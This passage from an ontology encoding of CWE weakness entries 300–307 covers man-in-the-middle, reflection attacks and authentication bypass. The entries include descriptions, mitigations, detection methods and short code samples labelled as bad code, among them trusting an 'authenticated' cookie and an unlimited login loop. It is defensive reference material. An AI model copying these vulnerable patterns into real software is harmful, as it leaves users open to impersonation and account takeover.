        rdfs:comment "In order to establish secure communication between two parties, it is often important to adequately verify the identity of entities at each end of the communication channel. Inadequate or inconsistent verification may result in insufficient or incorrect identification of either communicating entity. This can have negative consequences such as misplaced trust in the entity at the other end of the channel. An attacker can leverage this by interposing between the communicating entities and masquerading as the original entity. In the absence of sufficient verification of identity, such an attacker can eavesdrop and potentially modify the communication between the original entities."^^xsd:string,
        rdfs:comment "Maintenance
The summary identifies multiple distinct possibilities, suggesting that this is a category that must be broken into more specific weaknesses."^^xsd:string,
        rdfs:comment "The product does not adequately verify the identity of actors at both ends of a communication channel, or does not adequately ensure the integrity of the channel, in a way that allows the channel to be accessed or influenced by an actor that is not an endpoint."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "chain: incorrect \"goto\" in Apple SSL product bypasses certificate validation, allowing man-in-the-middle attack (Apple \"goto fail\" bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint ('Man-in-the-Middle'))."^^xsd:string
                 
                 references  CVE-2014-1266,
     
     Annotations: rdfs:comment "Leveraging Active Man in the Middle Attacks to Bypass Same Origin Policy"^^xsd:string
                 
                 related_attack_patterns  CAPEC-466,
     
     Annotations: rdfs:comment "Utilizing REST's Trust in the System Resource to Register Man in the Middle"^^xsd:string
                 
                 related_attack_patterns  CAPEC-57,
     
     Annotations: rdfs:comment "Man in the Middle Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-94,
     ID  "300"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Modify Application Data"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Adhere to the principle of complete mediation."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could pose as one of the entities and read or possibly modify the communication."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "In the Java snippet below, data is sent over an unencrypted channel to a remote server.

Example Language: Java /* (bad code) */
Socket sock;
PrintWriter out;

try {
sock = new Socket(REMOTE_HOST, REMOTE_PORT);
out = new PrintWriter(echoSocket.getOutputStream(), true);

// Write data to remote host via socket output stream. 
...
}
By eavesdropping on the communication channel or posing as the endpoint, an attacker would be able to read all of the transmitted data."^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "A certificate binds an identity to a cryptographic key to authenticate a communicating party. Often, the certificate takes the encrypted form of the hash of the identity of the subject, the public key, and information such as time of issue or expiration using the issuer's private key. The certificate can be validated by deciphering the certificate with the issuer's public key. See also X.509 certificate signature chains and the PGP certification structure."^^xsd:string, 
                 rdfs:comment "Always fully authenticate both ends of any communications channel."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-301_Reflection_Attack_in_an_Authentication_Protocol

    Annotations: 
        rdfs:comment "A mutual authentication protocol requires each party to respond to a random challenge by the other party by encrypting it with a pre-shared key. Often, however, such protocols employ the same pre-shared key for communication with a number of different entities. A malicious user or an attacker can easily compromise this protocol without possessing the correct key by employing a reflection attack on the protocol."^^xsd:string,
        rdfs:comment "Maintenance
The term \"reflection\" is used in multiple ways within CWE and the community, so its usage should be reviewed."^^xsd:string,
        rdfs:comment "Other
Reflection attacks capitalize on mutual authentication schemes in order to trick the target into revealing the secret shared between it and another valid user. In a basic mutual-authentication scheme, a secret is known to both the valid user and the server; this allows them to authenticate. In order that they may verify this shared secret without sending it plainly over the wire, they utilize a Diffie-Hellman-style scheme in which they each pick a value, then request the hash of that value as keyed by the shared secret. In a reflection attack, the attacker claims to be a valid user and requests the hash of a random value from the server. When the server returns this value and requests its own value to be hashed, the attacker opens another connection to the server. This time, the hash requested by the attacker is the value which the server requested in the first connection. When the server returns this hashed value, it is used in the first connection, authenticating the attacker successfully as the impersonated valid user."^^xsd:string,
        rdfs:comment "Simple authentication protocols are subject to reflection attacks if a malicious user can use the target machine to impersonate a trusted user."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2005-3435,
     related_attack_patterns  CAPEC-90,
     ID  "301"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The primary result of reflection attacks is successful authentication with a target machine -- as an impersonated user."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Let the initiator prove its identity before proceeding."^^xsd:string, 
                 rdfs:comment "Use different keys for the initiator and responder or of a different type of challenge for the initiator and responder."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following example demonstrates the weakness.

(bad code)
Example Language: C 
unsigned char *simple_digest(char *alg,char *buf,unsigned int len, int *olen) {
const EVP_MD *m;
EVP_MD_CTX ctx;
unsigned char *ret;
OpenSSL_add_all_digests();
if (!(m = EVP_get_digestbyname(alg))) return NULL;
if (!(ret = (unsigned char*)malloc(EVP_MAX_MD_SIZE))) return NULL;
EVP_DigestInit(&ctx, m);
EVP_DigestUpdate(&ctx,buf,len);
EVP_DigestFinal(&ctx,ret,olen);
return ret;
}
unsigned char *generate_password_and_cmd(char *password_and_cmd) {
simple_digest(\"sha1\",password,strlen(password_and_cmd)
...
);
}
(bad code)
Example Language: Java 
String command = new String(\"some cmd to execute & the password\") MessageDigest encer = MessageDigest.getInstance(\"SHA\");
encer.update(command.getBytes(\"UTF-8\"));
byte[] digest = encer.digest();"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-302_Authentication_Bypass_by_Assumed-Immutable_Data

    Annotations: 
        rdfs:comment "The authentication scheme or implementation uses key data elements that are assumed to be immutable, but can be controlled or modified by the attacker."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2002-0367,
     references  CVE-2002-1730,
     references  CVE-2002-1734,
     references  CVE-2002-2054,
     references  CVE-2002-2064,
     references  CVE-2004-0261,
     references  CVE-2004-1611,
     references  CVE-2005-1708,
     references  CVE-2005-1787,
     related_attack_patterns  CAPEC-10,
     related_attack_patterns  CAPEC-13,
     related_attack_patterns  CAPEC-21,
     related_attack_patterns  CAPEC-274,
     related_attack_patterns  CAPEC-31,
     related_attack_patterns  CAPEC-39,
     related_attack_patterns  CAPEC-45,
     related_attack_patterns  CAPEC-77,
     ID  "302"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Implement proper protection for immutable data (e.g. environment variable, hidden form fields, etc.)"^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "In the following example, an \"authenticated\" cookie is used to determine whether or not a user should be granted access to a system.

(bad code)
Example Language: Java 
boolean authenticated = new Boolean(getCookieValue(\"authenticated\")).booleanValue();
if (authenticated) {
...
}
Of course, modifying the value of a cookie on the client-side is trivial, but many developers assume that cookies are essentially immutable."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Implement proper protection for immutable data (e.g. environment variable, hidden form fields, etc.)"^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Implement proper protection for immutable data (e.g. environment variable, hidden form fields, etc.)"^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-303_Incorrect_Implementation_of_Authentication_Algorithm

    Annotations: 
        rdfs:comment "The requirements for the software dictate the use of an established authentication algorithm, but the implementation of the algorithm is incorrect."^^xsd:string,
        rdfs:comment "This incorrect implementation may allow authentication to be bypassed."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2003-0750,
     related_attack_patterns  CAPEC-90,
     ID  "303"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-304_Missing_Critical_Step_in_Authentication

    Annotations: 
        rdfs:comment "Authentication techniques should follow the algorithms that define them exactly, otherwise authentication can be bypassed or more easily subjected to brute force attacks."^^xsd:string,
        rdfs:comment "The software implements an authentication technique, but it skips a step that weakens the technique."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2004-2163,
     ID  "304"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string, 
                 rdfs:comment "This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or allowing attackers to execute arbitrary code."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Bypass Protection Mechanism"^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-305_Authentication_Bypass_by_Primary_Weakness

    Annotations: 
        rdfs:comment "Relationship
Most \"authentication bypass\" errors are resultant, not primary."^^xsd:string,
        rdfs:comment "The authentication algorithm is sound, but the implemented mechanism can be bypassed as the result of a separate weakness that is primary to the authentication error."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2000-0979,
     references  CVE-2001-0088,
     references  CVE-2002-1374,
     ID  "305"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-306_Missing_Authentication_for_Critical_Function

    Annotations: 
        rdfs:comment "Relationship
This is separate from \"bypass\" issues in which authentication exists, but is faulty."^^xsd:string,
        rdfs:comment "The software does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2002-1810,
     references  CVE-2004-0213,
     references  CVE-2008-6827,
     related_attack_patterns  CAPEC-12,
     related_attack_patterns  CAPEC-225,
     related_attack_patterns  CAPEC-36,
     related_attack_patterns  CAPEC-40,
     related_attack_patterns  CAPEC-62,
     ID  "306"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability.
Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port.
In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout."^^xsd:string, 
                 rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator [REF-45]."^^xsd:string, 
                 rdfs:comment "Where possible, avoid implementing custom authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These may make it easier to provide a clear separation between authentication tasks and authorization tasks.
In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "Exposing critical functionality essentially provides an attacker with the privilege level of that functionality. The consequences will depend on the associated functionality, but they can range from reading or modifying sensitive data, access to administrative or other privileged functionality, or possibly even execution of arbitrary code."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "In the following Java example the method createBankAccount is used to create a BankAccount object for a bank management application.

Example Language: Java  /* (bad code) */
public BankAccount createBankAccount(String accountNumber, String accountType,
String accountName, String accountSSN, double balance) {
BankAccount account = new BankAccount();
account.setAccountNumber(accountNumber);
account.setAccountType(accountType);
account.setAccountOwnerName(accountName);
account.setAccountOwnerSSN(accountSSN);
account.setBalance(balance);

return account;
}
However, there is no authentication mechanism to ensure that the user creating this bank account object has the authority to create new bank accounts. Some authentication mechanisms should be used to verify that the user has the authority to create bank account objects.

The following Java code includes a boolean variable and method for authenticating a user. If the user has not been authenticated then the createBankAccount will not create the bank account object.

Example Language: Java   /* (good code) */
private boolean isUserAuthentic = false;

// authenticate user, 

// if user is authenticated then set variable to true 

// otherwise set variable to false 
public boolean authenticateUser(String username, String password) {
...
}

public BankAccount createNewBankAccount(String accountNumber, String accountType,
String accountName, String accountSSN, double balance) {
BankAccount account = null;

if (isUserAuthentic) {
account = new BankAccount();
account.setAccountNumber(accountNumber);
account.setAccountType(accountType);
account.setAccountOwnerName(accountName);
account.setAccountOwnerSSN(accountSSN);
account.setBalance(balance);
}
return account;
}"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Web Application Scanner
- Web Services Scanner
- Database Scanners"^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Host Application Interface Scanner
- Fuzz Tester
- Framework-based Fuzzer"^^xsd:string, 
                 rdfs:comment "Analysis with Manual Results Interpretation"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Gain Privileges or Assume Identity"^^xsd:string,
     other  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Source code Weakness Analyzer
- Context-configured Source Code Weakness Analyzer"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Automated static analysis is useful for detecting commonly-used idioms for authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.
Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives."^^xsd:string, 
                 rdfs:comment "Effectiveness: Limited"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Focused Manual Spotcheck - Focused manual analysis of source
- Manual Source Code Review (not inspections)"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string, 
                 rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Specifically, manual static analysis is useful for evaluating the correctness of custom authentication mechanisms."^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-307_Improper_Restriction_of_Excessive_Authentication_Attempts

    Annotations: 
        rdfs:comment "The software does not implement sufficient measures to prevent multiple failed authentication attempts within in a short time frame, making it more susceptible to brute force attacks."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-1999-1152,
     references  CVE-1999-1324,
     references  CVE-2001-0395,
     references  CVE-2001-1291,
     references  CVE-2001-1339,
     references  CVE-2002-0628,
     ID  "307"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could perform an arbitrary number of authentication attempts using different passwords, and eventually gain access to the targeted account."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Common protection mechanisms include:
- Disconnecting the user after a small number of failed attempts
- Implementing a timeout
- Locking out a targeted account
- Requiring a computational task on the user's part."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator. [REF-45]"^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.

Example 1 References:
[REF-236] Kim Zetter. \"Weak Password Brings 'Happiness' to Twitter Hacker\". 2009-01-09. <http://www.wired.com/threatlevel/2009/01/professed-twitt/>."^^xsd:string, 
                 rdfs:comment "In the following C/C++ example the validateUser method opens a socket connection, reads a username and password from the socket and attempts to authenticate the username and password.

Example Language: C  /* (bad code) */
int validateUser(char *host, int port)
{
int socket = openSocketConnection(host, port);
if (socket < 0) {
printf(\"Unable to open socket connection\");
return(FAIL);
}

int isValidUser = 0;
char username[USERNAME_SIZE];
char password[PASSWORD_SIZE];

while (isValidUser == 0) {
if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {
if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {
isValidUser = AuthenticateUser(username, password);
}
}
}
return(SUCCESS);
}
The validateUser method will continuously check for a valid username and password without any restriction on the number of authentication attempts made. The method should limit the number of authentication attempts made to prevent brute force attacks as in the following example code.

Example Language: C  /* (good code) */
int validateUser(char *host, int port)
{
...

int count = 0;
while ((isValidUser == 0) && (count < MAX_ATTEMPTS)) {
if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {
if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {
isValidUser = AuthenticateUser(username, password);
}
}
count++;
}
if (isValidUser) {
return(SUCCESS);
}
else {
return(FAIL);
}
}"^^xsd:string, 
                 rdfs:comment "The following code, extracted from a servlet's doPost() method, performs an authentication lookup every time the servlet is invoked.

Example Language: Java  /* (bad code) */
String username = request.getParameter(\"username\");
String password = request.getParameter(\"password\");

int authResult = authenticateUser(username, password);
However, the software makes no attempt to restrict excessive authentication attempts."^^xsd:string, 
                 rdfs:comment "This code attempts to limit the number of login attempts by causing the process to sleep before completing the authentication.

Example Language: PHP /* (bad code) */
$username = $_POST['username'];
$password = $_POST['password'];
sleep(2000);
$isAuthenticated = authenticateUser($username, $password);
However, there is no limit on parallel connections, so this does not increase the amount of time an attacker needs to complete an attack."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Web Application Scanner
- Web Services Scanner
- Database Scanners
Cost effective for partial coverage:
- Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria"^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Web Application Scanner
- Web Services Scanner
- Database Scanners
Cost effective for partial coverage:
- Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
